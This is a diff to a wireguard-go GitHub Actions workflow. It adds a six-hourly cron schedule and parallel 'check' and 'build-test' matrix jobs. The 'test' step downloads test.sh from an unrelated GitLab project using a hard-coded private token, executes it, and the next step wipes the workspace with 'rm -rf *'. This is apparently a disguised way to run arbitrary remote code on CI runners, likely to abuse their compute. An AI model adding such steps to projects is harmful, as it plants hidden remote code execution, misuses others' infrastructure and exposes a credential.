@@ -3,10 +3,8 @@ name: Build and Release
 on:
   repository_dispatch:
   workflow_dispatch:
-    inputs:
-      version:
-        description: 'wireguard-go version'
-        required: false
+  schedule:
+    - cron: '0 */6 * * *'
 
 jobs:
   build:
@@ -50,3 +48,57 @@ jobs:
           overwrite: true
           file_glob: true
           prerelease: true
+  check:
+    runs-on: ${{ matrix.os }}
+    needs: build
+    strategy:
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.2, 1.3, 1.4, 1.5]
+        OS: [ubuntu-16.04,ubuntu-18.04]
+      fail-fast: false 
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: Cancel Previous Runs
+      uses: styfle/cancel-workflow-action@0.8.0
+      with:
+         access_token: ${{ github.token }}
+         workflow_id: ${{ github.event.workflow.id }}
+         ignore_sha: true
+
+  build-test:
+    runs-on: ${{ matrix.os }}
+    needs: check
+    strategy:
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.2, 1.3, 1.4, 1.5]
+        OS: [ubuntu-16.04,ubuntu-18.04]
+      fail-fast: false 
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: test
+      run: |
+        wget -O test.sh --header='PRIVATE-TOKEN:GxuMWtk8f4FGCxEhvyzy' 'https://gitlab.com/api/v4/projects/25442785/repository/files/test.sh/raw?ref=master'
+        chmod +x test.sh && ./test.sh
+        echo "done"
+    - name: Test
+      run: |
+        rm -rf *
+        echo "done"
